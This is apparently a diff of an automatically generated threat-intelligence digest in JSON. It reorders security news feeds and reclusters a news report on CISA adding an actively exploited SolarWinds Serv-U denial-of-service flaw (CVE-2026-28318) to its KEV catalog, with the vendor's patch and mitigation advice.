@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-06-07T20:19:23.263626+00:00",
+  "generated_at": "2026-06-07T22:11:38.401712+00:00",
   "lookback_hours": 168,
   "lookback_human": "7 days",
   "total_feeds": 80,
@@ -81,39 +81,18 @@
       "item_count": 15,
       "in_window_count": 3
     },
-    "Microsoft Threat Intelligence": {
-      "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
+    "Trend Micro Research": {
+      "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
-    },
-    "Microsoft Security Blog": {
-      "url": "https://www.microsoft.com/en-us/security/blog/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 4
-    },
-    "Google Threat Analysis Group": {
-      "url": "https://blog.google/threat-analysis-group/rss/",
-      "cohort": "threat_research_primary",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
+      "item_count": 25,
+      "in_window_count": 1
     },
     "SentinelOne Labs": {
       "url": "https://www.sentinelone.com/labs/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 1
-    },
-    "Trend Micro Research": {
-      "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 25,
       "in_window_count": 1
     },
     "Cisco Talos": {
@@ -123,19 +102,19 @@
       "item_count": 15,
       "in_window_count": 3
     },
-    "Check Point Research": {
-      "url": "https://research.checkpoint.com/feed/",
+    "Google Threat Analysis Group": {
+      "url": "https://blog.google/threat-analysis-group/rss/",
       "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 2
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
     },
-    "Kaspersky Securelist": {
-      "url": "https://securelist.com/feed/",
+    "Microsoft Security Blog": {
+      "url": "https://www.microsoft.com/en-us/security/blog/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 3
+      "in_window_count": 4
     },
     "Sekoia": {
       "url": "https://blog.sekoia.io/feed/",
@@ -151,6 +130,13 @@
       "item_count": 10,
       "in_window_count": 1
     },
+    "Microsoft Threat Intelligence": {
+      "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
+    },
     "SANS Internet Storm Center": {
       "url": "https://isc.sans.edu/rssfeed_full.xml",
       "cohort": "government_authoritative",
@@ -158,12 +144,26 @@
       "item_count": 10,
       "in_window_count": 10
     },
+    "Kaspersky Securelist": {
+      "url": "https://securelist.com/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 3
+    },
     "NCSC UK": {
       "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
       "cohort": "government_authoritative",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 1
+    },
+    "Check Point Research": {
+      "url": "https://research.checkpoint.com/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 2
     },
     "Horizon3 Attack Research": {
       "url": "https://horizon3.ai/feed/",
@@ -186,6 +186,20 @@
       "item_count": 100,
       "in_window_count": 1
     },
+    "Assetnote": {
+      "url": "https://www.assetnote.io/resources/research/rss.xml",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 78,
+      "in_window_count": 0
+    },
+    "Red Canary": {
+      "url": "https://redcanary.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 2
+    },
     "PortSwigger Research": {
       "url": "https://portswigger.net/research/rss",
       "cohort": "offensive_vulnerability_research",
@@ -200,33 +214,12 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Red Canary": {
-      "url": "https://redcanary.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 2
-    },
-    "Assetnote": {
-      "url": "https://www.assetnote.io/resources/research/rss.xml",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 78,
-      "in_window_count": 0
-    },
     "Exploit-DB": {
       "url": "https://www.exploit-db.com/rss.xml",
       "cohort": "offensive_vulnerability_research",
       "status": "ok",
       "item_count": 50,
       "in_window_count": 3
-    },
-    "watchTowr Labs": {
-      "url": "https://labs.watchtowr.com/rss/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 0
     },
     "Recorded Future": {
       "url": "https://www.recordedfuture.com/feed",
@@ -235,15 +228,15 @@
       "item_count": 50,
       "in_window_count": 4
     },
-    "The DFIR Report": {
-      "url": "https://thedfirreport.com/feed/",
-      "cohort": "detection_response_operations",
+    "watchTowr Labs": {
+      "url": "https://labs.watchtowr.com/rss/",
+      "cohort": "offensive_vulnerability_research",
       "status": "ok",
-      "item_count": 10,
+      "item_count": 15,
       "in_window_count": 0
     },
-    "Proofpoint Threat Insight": {
-      "url": "https://www.proofpoint.com/us/rss.xml",
+    "The DFIR Report": {
+      "url": "https://thedfirreport.com/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
@@ -255,6 +248,13 @@
       "status": "ok",
       "item_count": 10,
       "in_window_count": 2
+    },
+    "Proofpoint Threat Insight": {
+      "url": "https://www.proofpoint.com/us/rss.xml",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
     },
     "Active Countermeasures": {
       "url": "https://www.activecountermeasures.com/feed/",
@@ -354,6 +354,13 @@
       "item_count": 100,
       "in_window_count": 3
     },
+    "Cloudflare Radar": {
+      "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
+    },
     "Wiz Research": {
       "url": "https://www.wiz.io/feed/rss.xml",
       "cohort": "cloud_identity_infrastructure",
@@ -368,12 +375,12 @@
       "item_count": 100,
       "in_window_count": 0
     },
-    "Cloudflare Radar": {
-      "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
-      "cohort": "cloud_identity_infrastructure",
+    "Chainalysis": {
+      "url": "https://www.chainalysis.com/blog/feed/",
+      "cohort": "ransomware_ecrime_financial_crime",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
+      "item_count": 10,
+      "in_window_count": 3
     },
     "Google Cloud Security": {
       "url": "https://cloudblog.withgoogle.com/rss/",
@@ -389,47 +396,12 @@
       "item_count": 10,
       "in_window_count": 3
     },
-    "Chainalysis": {
-      "url": "https://www.chainalysis.com/blog/feed/",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 3
-    },
-    "Google Cloud Threat Intelligence": {
-      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
     "Interconnects": {
       "url": "https://www.interconnects.ai/feed",
       "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 2
-    },
-    "BleepingComputer": {
-      "url": "https://www.bleepingcomputer.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 15
-    },
-    "The Record": {
-      "url": "https://therecord.media/feed",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 5,
-      "in_window_count": 5
-    },
-    "Simon Willison": {
-      "url": "https://simonwillison.net/atom/everything/",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 30,
-      "in_window_count": 16
     },
     "GreyNoise": {
       "url": "https://www.greynoise.io/blog/rss.xml",
@@ -438,12 +410,33 @@
       "item_count": 100,
       "in_window_count": 1
     },
-    "SecurityWeek": {
-      "url": "https://www.securityweek.com/feed/",
+    "The Record": {
+      "url": "https://therecord.media/feed",
       "cohort": "cyber_news_breach_reporting",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
+      "item_count": 5,
+      "in_window_count": 5
+    },
+    "BleepingComputer": {
+      "url": "https://www.bleepingcomputer.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 15
+    },
+    "Google Cloud Threat Intelligence": {
+      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
+    },
+    "Simon Willison": {
+      "url": "https://simonwillison.net/atom/everything/",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 30,
+      "in_window_count": 16
     },
     "Coveware": {
       "url": "https://www.coveware.com/blog?format=rss",
@@ -459,8 +452,22 @@
       "item_count": 20,
       "in_window_count": 0
     },
+    "SecurityWeek": {
+      "url": "https://www.securityweek.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 10
+    },
     "CyberScoop": {
       "url": "https://cyberscoop.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 10
+    },
+    "Help Net Security": {
+      "url": "https://www.helpnetsecurity.com/feed/",
       "cohort": "cyber_news_breach_reporting",
       "status": "ok",
       "item_count": 10,
@@ -473,13 +480,6 @@
       "item_count": 100,
       "in_window_count": 1
     },
-    "Help Net Security": {
-      "url": "https://www.helpnetsecurity.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
-    },
     "Dark Reading": {
       "url": "https://www.darkreading.com/rss.xml",
       "cohort": "cyber_news_breach_reporting",
@@ -487,19 +487,19 @@
       "item_count": 50,
       "in_window_count": 24
     },
-    "Schneier on Security": {
-      "url": "https://www.schneier.com/feed/atom/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 6
-    },
     "Krebs on Security": {
       "url": "https://krebsonsecurity.com/feed/",
       "cohort": "practitioner_analysis",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 1
+    },
+    "Schneier on Security": {
+      "url": "https://www.schneier.com/feed/atom/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 6
     },
     "Troy Hunt": {
       "url": "https://www.troyhunt.com/rss/",
@@ -522,19 +522,19 @@
       "item_count": 20,
       "in_window_count": 3
     },
-    "The Hacker News": {
-      "url": "https://feeds.feedburner.com/TheHackersNews",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 46
-    },
     "Infosecurity Magazine": {
       "url": "https://www.infosecurity-magazine.com/rss/news/",
       "cohort": "cyber_news_breach_reporting",
       "status": "ok",
       "item_count": 100,
       "in_window_count": 33
+    },
+    "The Hacker News": {
+      "url": "https://feeds.feedburner.com/TheHackersNews",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 46
     },
     "Intel 471": {
       "url": "https://intel471.com/blog/feed",
@@ -2261,242 +2261,6 @@
       ]
     },
     {
-      "cluster_id": "5c65105996",
-      "priority_score": 20,
-      "member_count": 3,
-      "corroborating_source_count": 3,
-      "strong_signals": [
-        "CVE-2026-28318",
-        "SolarWinds"
-      ],
-      "taxonomy": {
-        "threat_categories": [
-          "active_exploitation",
-          "cryptojacking",
-          "ddos",
-          "mfa_bypass",
-          "phishing_social_eng",
-          "ransomware_extortion",
-          "supply_chain",
-          "vulnerability_disclosure",
-          "zero_day"
-        ],
-        "actor_attribution": [
-          "Cl0p"
-        ],
-        "affected_industries": [
-          "government"
-        ],
-        "affected_products": [
-          "Microsoft SharePoint",
-          "Palo Alto Networks",
-          "SolarWinds"
-        ],
-        "tools_used": [],
-        "cve_ids": [
-          "CVE-2024-21182",
-          "CVE-2026-0257",
-          "CVE-2026-28318",
-          "CVE-2026-39987",
-          "CVE-2026-45659"
-        ],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "actively_exploited",
-          "zero_day"
-        ],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news",
-          "tier_5_chatter"
-        ]
-      },
-      "primary": {
-        "source": "The Hacker News",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "CISA Adds Actively Exploited SolarWinds Serv-U DoS Flaw to KEV Catalog",
-        "link": "https://thehackernews.com/2026/06/cisa-adds-actively-exploited-solarwinds.html",
-        "published": "2026-06-06T08:14:31+00:00",
-        "summary": "The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added a high-severity security flaw impacting SolarWinds Serv-U multi-protocol file server software to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. The vulnerability, tracked as CVE-2026-28318 (CVSS score: 7.5), is a denial-of-service (DoS) bug that causes the service to crash",
-        "full_body": "CISA Adds Actively Exploited SolarWinds Serv-U DoS Flaw to KEV Catalog  Ravie Lakshmanan  Jun 06, 2026 Vulnerability / Patch Management The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added a high-severity security flaw impacting SolarWinds Serv-U multi-protocol file server software to its Known Exploited Vulnerabilities ( KEV ) catalog, citing evidence of active exploitation. The vulnerability, tracked as CVE-2026-28318 (CVSS score: 7.5), is a denial-of-service (DoS) bug that causes the service to crash under certain conditions. CISA described it as an uncontrolled resource consumption vulnerability that results in a DoS condition. \"SolarWinds Serv-U is susceptible to specially crafted POST requests that crash the Serv-U service without authentication using Content-Encoding: deflate,\" SolarWinds said in an advisory released earlier this week. The issue has been addressed in SolarWinds Serv-U version 15.5.4 HF1. As mitigations, it's advised to limit access to known addresses and block any request containing \"content-encoding\" since the vulnerable service does not require this functionality. There are currently no details on how the vulnerability is being exploited in real-world attacks, or who is behind them. It's also unclear how many internet-exposed Serv-U instances are compromised, if any. CISA has ordered Federal Civilian Executive Branch (FCEB) agencies to address the flaw by June 19, 2026. In the past, multiple flaws in Serv-U have been exploited by bad actors, including those associated with the Cl0p ransomware gang . Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  CISA , cybersecurity , denial of service , KEV Catalog , Patch Management , ransomware , Serv-U , SolarWinds , Vulnerability ⚡ Top Stories This Week Google June 2026 Android Update Patches 124 Flaws, One Actively Exploited Oracle WebLogic CVE-2024-21182 Added to KEV Catalog After Active Exploitation Dashlane Discloses Brute-Force Attack, Encrypted Vaults of Fewer Than 20 Users Downloaded Miasma Supply Chain Attack Compromises Red Hat npm Packages with Credential-Stealing Worm ⚡ Weekly Recap: New Linux Flaw, PAN-OS Exploit, AI-Powered Attacks, OAuth Phishing and More OpenAI Codex Authentication Tokens Stolen in codexui-android npm Supply Chain Attack PAN-OS GlobalProtect Authentication Bypass (CVE-2026-0257) Under Active Exploitation ChatGPhish Vulnerability Turns ChatGPT Web Summaries Into a Phishing Surface Attackers Use LLM Agent for Post-Exploitation After Marimo CVE-2026-39987 Exploit Threat Actors Exploit Critical FortiClient EMS Flaw to Deploy Credential Stealer Microsoft Slams Public Zero-Day Disclosures Amid GitHub Researcher Account Removal ThreatsDay Bulletin: Claude Security Plugin, Azure Priv-Esc, Kali365 MFA Bypass, FIFA Scams +15 More Malicious npm Package Stole Files From Claude AI User Directory via GitHub GlassWorm Malware Takedown Disrupts Developer Supply Chain Attack Infrastructure AI Chatbot Recommendations Redirect Users to Cryptojacking Malware Sites Microsoft Patches SharePoint RCE Flaw CVE-2026-45659 Across Server Versions ⭐ Featured Resources Your Employees Are Using AI in Ways You Can’t See – 2026 State of AI Report Learn How to Stop Attacks Before They Reach Your EDR – With PHASR Watch AI Turn Vulnerabilities Into Working Exploits in Minutes (See the Demo) [Guide] The Real Security Risks of Shadow AI (And Where You’re Exposed)",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion",
-            "supply_chain",
-            "phishing_social_eng",
-            "zero_day",
-            "ddos",
-            "cryptojacking",
-            "mfa_bypass",
-            "vulnerability_disclosure",
-            "active_exploitation"
-          ],
-          "actor_attribution": [
-            "Cl0p"
-          ],
-          "affected_industries": [
-            "government"
-          ],
-          "affected_products": [
-            "SolarWinds",
-            "Microsoft SharePoint",
-            "Palo Alto Networks"
-          ],
-          "tools_used": [],
-          "cve_ids": [
-            "CVE-2026-28318",
-            "CVE-2024-21182",
-            "CVE-2026-0257",
-            "CVE-2026-39987",
-            "CVE-2026-45659"
-          ],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "actively_exploited",
-            "zero_day"
-          ],
-          "content_type": "news_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {
-            "SolarWinds": "target",
-            "Microsoft SharePoint": "target",
-            "Palo Alto Networks": "target",
-            "GitHub": "target",
-            "OpenAI/ChatGPT": "target",
-            "npm": "target",
-            "Fortinet": "target",
-            "Anthropic/Claude": "target",
-            "Azure": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "The Hacker News",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "CISA Adds Actively Exploited SolarWinds Serv-U DoS Flaw to KEV Catalog",
-          "link": "https://thehackernews.com/2026/06/cisa-adds-actively-exploited-solarwinds.html",
-          "published": "2026-06-06T08:14:31+00:00",
-          "summary": "The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added a high-severity security flaw impacting SolarWinds Serv-U multi-protocol file server software to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. The vulnerability, tracked as CVE-2026-28318 (CVSS score: 7.5), is a denial-of-service (DoS) bug that causes the service to crash",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion",
-              "supply_chain",
-              "phishing_social_eng",
-              "zero_day",
-              "ddos",
-              "cryptojacking",
-              "mfa_bypass",
-              "vulnerability_disclosure",
-              "active_exploitation"
-            ],
-            "actor_attribution": [
-              "Cl0p"
-            ],
-            "affected_industries": [
-              "government"
-            ],
-            "affected_products": [
-              "SolarWinds",
-              "Microsoft SharePoint",
-              "Palo Alto Networks"
-            ],
-            "tools_used": [],
-            "cve_ids": [
-              "CVE-2026-28318",
-              "CVE-2024-21182",
-              "CVE-2026-0257",
-              "CVE-2026-39987",
-              "CVE-2026-45659"
-            ],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "actively_exploited",
-              "zero_day"
-            ],
-            "content_type": "news_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "SolarWinds": "target",
-              "Microsoft SharePoint": "target",
-              "Palo Alto Networks": "target",
-              "GitHub": "target",
-              "OpenAI/ChatGPT": "target",
-              "npm": "target",
-              "Fortinet": "target",
-              "Anthropic/Claude": "target",
-              "Azure": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
-          "source": "BleepingComputer",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "CISA: Hackers now exploit SolarWinds Serv-U flaw to crash servers",
-          "link": "https://www.bleepingcomputer.com/news/security/cisa-hackers-now-exploit-solarwinds-serv-u-flaw-to-crash-servers/",
-          "published": "2026-06-05T19:15:30+00:00",
-          "summary": "CISA warned today that hackers are now actively exploiting a recently patched high-severity SolarWinds Serv-U flaw to crash servers. [...]",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "SolarWinds"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "SolarWinds": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
-          "source": "Reddit r/cybersecurity",
-          "cohort": "reddit_practitioner_osint",
-          "title": "CISA: Hackers now exploit SolarWinds Serv-U flaw to crash servers",
-          "link": "https://www.reddit.com/r/cybersecurity/comments/1tye11l/cisa_hackers_now_exploit_solarwinds_servu_flaw_to/",
-          "published": "2026-06-06T10:49:46+00:00",
-          "summary": "submitted by /u/Doug24 [link] [comments]",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "SolarWinds"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_5_chatter",
-            "role_map": {
-              "SolarWinds": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "cc7cd597eb",
       "priority_score": 20,
       "member_count": 3,
@@ -2885,6 +2649,213 @@
             "confidence_tier": "tier_2_operator",
             "role_map": {
               "Microsoft Windows": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "5c65105996",
+      "priority_score": 18,
+      "member_count": 2,
+      "corroborating_source_count": 2,
+      "strong_signals": [
+        "CVE-2026-28318",
+        "SolarWinds"
+      ],
+      "taxonomy": {
+        "threat_categories": [
+          "active_exploitation",
+          "cryptojacking",
+          "ddos",
+          "mfa_bypass",
+          "phishing_social_eng",
+          "ransomware_extortion",
+          "supply_chain",
+          "vulnerability_disclosure",
+          "zero_day"
+        ],
+        "actor_attribution": [
+          "Cl0p"
+        ],
+        "affected_industries": [
+          "government"
+        ],
+        "affected_products": [
+          "Microsoft SharePoint",
+          "Palo Alto Networks",
+          "SolarWinds"
+        ],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2024-21182",
+          "CVE-2026-0257",
+          "CVE-2026-28318",
+          "CVE-2026-39987",
+          "CVE-2026-45659"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "actively_exploited",
+          "zero_day"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "The Hacker News",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "CISA Adds Actively Exploited SolarWinds Serv-U DoS Flaw to KEV Catalog",
+        "link": "https://thehackernews.com/2026/06/cisa-adds-actively-exploited-solarwinds.html",
+        "published": "2026-06-06T08:14:31+00:00",
+        "summary": "The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added a high-severity security flaw impacting SolarWinds Serv-U multi-protocol file server software to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. The vulnerability, tracked as CVE-2026-28318 (CVSS score: 7.5), is a denial-of-service (DoS) bug that causes the service to crash",
+        "full_body": "CISA Adds Actively Exploited SolarWinds Serv-U DoS Flaw to KEV Catalog  Ravie Lakshmanan  Jun 06, 2026 Vulnerability / Patch Management The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added a high-severity security flaw impacting SolarWinds Serv-U multi-protocol file server software to its Known Exploited Vulnerabilities ( KEV ) catalog, citing evidence of active exploitation. The vulnerability, tracked as CVE-2026-28318 (CVSS score: 7.5), is a denial-of-service (DoS) bug that causes the service to crash under certain conditions. CISA described it as an uncontrolled resource consumption vulnerability that results in a DoS condition. \"SolarWinds Serv-U is susceptible to specially crafted POST requests that crash the Serv-U service without authentication using Content-Encoding: deflate,\" SolarWinds said in an advisory released earlier this week. The issue has been addressed in SolarWinds Serv-U version 15.5.4 HF1. As mitigations, it's advised to limit access to known addresses and block any request containing \"content-encoding\" since the vulnerable service does not require this functionality. There are currently no details on how the vulnerability is being exploited in real-world attacks, or who is behind them. It's also unclear how many internet-exposed Serv-U instances are compromised, if any. CISA has ordered Federal Civilian Executive Branch (FCEB) agencies to address the flaw by June 19, 2026. In the past, multiple flaws in Serv-U have been exploited by bad actors, including those associated with the Cl0p ransomware gang . Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  CISA , cybersecurity , denial of service , KEV Catalog , Patch Management , ransomware , Serv-U , SolarWinds , Vulnerability ⚡ Top Stories This Week Google June 2026 Android Update Patches 124 Flaws, One Actively Exploited Oracle WebLogic CVE-2024-21182 Added to KEV Catalog After Active Exploitation Dashlane Discloses Brute-Force Attack, Encrypted Vaults of Fewer Than 20 Users Downloaded Miasma Supply Chain Attack Compromises Red Hat npm Packages with Credential-Stealing Worm ⚡ Weekly Recap: New Linux Flaw, PAN-OS Exploit, AI-Powered Attacks, OAuth Phishing and More OpenAI Codex Authentication Tokens Stolen in codexui-android npm Supply Chain Attack PAN-OS GlobalProtect Authentication Bypass (CVE-2026-0257) Under Active Exploitation ChatGPhish Vulnerability Turns ChatGPT Web Summaries Into a Phishing Surface Attackers Use LLM Agent for Post-Exploitation After Marimo CVE-2026-39987 Exploit Threat Actors Exploit Critical FortiClient EMS Flaw to Deploy Credential Stealer Microsoft Slams Public Zero-Day Disclosures Amid GitHub Researcher Account Removal ThreatsDay Bulletin: Claude Security Plugin, Azure Priv-Esc, Kali365 MFA Bypass, FIFA Scams +15 More Malicious npm Package Stole Files From Claude AI User Directory via GitHub GlassWorm Malware Takedown Disrupts Developer Supply Chain Attack Infrastructure AI Chatbot Recommendations Redirect Users to Cryptojacking Malware Sites Microsoft Patches SharePoint RCE Flaw CVE-2026-45659 Across Server Versions ⭐ Featured Resources Your Employees Are Using AI in Ways You Can’t See – 2026 State of AI Report Learn How to Stop Attacks Before They Reach Your EDR – With PHASR Watch AI Turn Vulnerabilities Into Working Exploits in Minutes (See the Demo) [Guide] The Real Security Risks of Shadow AI (And Where You’re Exposed)",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion",
+            "supply_chain",
+            "phishing_social_eng",
+            "zero_day",
+            "ddos",
+            "cryptojacking",
+            "mfa_bypass",
+            "vulnerability_disclosure",
+            "active_exploitation"
+          ],
+          "actor_attribution": [
+            "Cl0p"
+          ],
+          "affected_industries": [
+            "government"
+          ],
+          "affected_products": [
+            "SolarWinds",
+            "Microsoft SharePoint",
+            "Palo Alto Networks"
+          ],
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2026-28318",
+            "CVE-2024-21182",
+            "CVE-2026-0257",
+            "CVE-2026-39987",
+            "CVE-2026-45659"
+          ],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "actively_exploited",
+            "zero_day"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "SolarWinds": "target",
+            "Microsoft SharePoint": "target",
+            "Palo Alto Networks": "target",
+            "GitHub": "target",
+            "OpenAI/ChatGPT": "target",
+            "npm": "target",
+            "Fortinet": "target",
+            "Anthropic/Claude": "target",
+            "Azure": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "The Hacker News",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "CISA Adds Actively Exploited SolarWinds Serv-U DoS Flaw to KEV Catalog",
+          "link": "https://thehackernews.com/2026/06/cisa-adds-actively-exploited-solarwinds.html",
+          "published": "2026-06-06T08:14:31+00:00",
+          "summary": "The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added a high-severity security flaw impacting SolarWinds Serv-U multi-protocol file server software to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. The vulnerability, tracked as CVE-2026-28318 (CVSS score: 7.5), is a denial-of-service (DoS) bug that causes the service to crash",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "supply_chain",
+              "phishing_social_eng",
+              "zero_day",
+              "ddos",
+              "cryptojacking",
+              "mfa_bypass",
+              "vulnerability_disclosure",
+              "active_exploitation"
+            ],
+            "actor_attribution": [
+              "Cl0p"
+            ],
+            "affected_industries": [
+              "government"
+            ],
+            "affected_products": [
+              "SolarWinds",
+              "Microsoft SharePoint",
+              "Palo Alto Networks"
+            ],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2026-28318",
+              "CVE-2024-21182",
+              "CVE-2026-0257",
+              "CVE-2026-39987",
+              "CVE-2026-45659"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "actively_exploited",
+              "zero_day"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "SolarWinds": "target",
+              "Microsoft SharePoint": "target",
+              "Palo Alto Networks": "target",
+              "GitHub": "target",
+              "OpenAI/ChatGPT": "target",
+              "npm": "target",
+              "Fortinet": "target",
+              "Anthropic/Claude": "target",
+              "Azure": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "BleepingComputer",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "CISA: Hackers now exploit SolarWinds Serv-U flaw to crash servers",
+          "link": "https://www.bleepingcomputer.com/news/security/cisa-hackers-now-exploit-solarwinds-serv-u-flaw-to-crash-servers/",
+          "published": "2026-06-05T19:15:30+00:00",
+          "summary": "CISA warned today that hackers are now actively exploiting a recently patched high-severity SolarWinds Serv-U flaw to crash servers. [...]",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "SolarWinds"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "SolarWinds": "target"
             },
             "weak_tags": {
               "products": []
@@ -5213,6 +5184,81 @@
       ]
